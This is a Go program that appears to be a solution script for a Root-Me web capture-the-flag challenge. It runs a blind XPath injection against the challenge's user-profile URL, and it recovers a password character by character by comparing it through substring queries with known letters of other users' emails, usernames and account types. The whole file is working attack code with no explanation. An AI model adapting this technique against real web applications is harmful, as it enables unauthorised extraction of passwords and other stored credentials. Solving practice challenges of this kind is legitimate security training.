package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
)

func HttpRes(url string) string {
	req, _ := http.NewRequest("GET", url, nil)
	res, _ := http.DefaultClient.Do(req)
	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)
	resp := string(body)
	return resp
}

func main() {
	username := [6]string{"Username", "Steve", "John", "Eric", "Jerry", "Elise"}
	email := [6]string{"Email", "steve@jobs.com", "John@doe.org", "ric@ard.biz", "Jerry@tomcat.net", "Elise@tomcat.net"}
	account := [6]string{"Account type", "subscriber", "administrator", "subscriber", "subscriber", "subscriber"}
	for pass := 1; pass <= 13; pass++ {
		var url = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2%20and%20substring(password,"
		count := 0
		str := strconv.Itoa(pass)
		url += str + ",1)%20=%20substring(//user["
		urlinit := url
		if count == 0 {
			for user := 0; user <= 6; user++ {
				if count == 0 {
					str1 := strconv.Itoa(user)
					url += str1
					for mail := 0; mail <= 20; mail++ {
						if count == 0 {
							url += "]/email," + strconv.Itoa(mail) + ",1)"
							resp := HttpRes(url)
							if strings.Contains(resp, "John's profile") {
								count++
								fmt.Println("character", pass)
								for i, j := range email[user] {
									if i == mail-1 {
										fmt.Println(string(j))
									}
								}
							}
							url = urlinit + str1
						}
					}
					for accnt := 0; accnt <= 15; accnt++ {
						if count == 0 {
							url += "]/account," + strconv.Itoa(accnt) + ",1)"
							resp := HttpRes(url)

							if strings.Contains(resp, "John's profile") {
								count++
								fmt.Println("character", pass)
								for i, j := range account[user] {
									if i == accnt-1 {
										fmt.Println(string(j))
									}
								}
							}
							url = urlinit + str1
						}
					}
					for uname := 0; uname <= 10; uname++ {
						if count == 0 {
							url += "]/username," + strconv.Itoa(uname) + ",1)"
							resp := HttpRes(url)
							if strings.Contains(resp, "John's profile") {
								count++
								fmt.Println("character", pass)
								for i, j := range username[user] {
									if i == uname-1 {
										fmt.Println(string(j))
									}
								}
							}
							url = urlinit + str1
						}
					}
					url = urlinit
				}

			}
		} else {
			continue
		}
	}
}
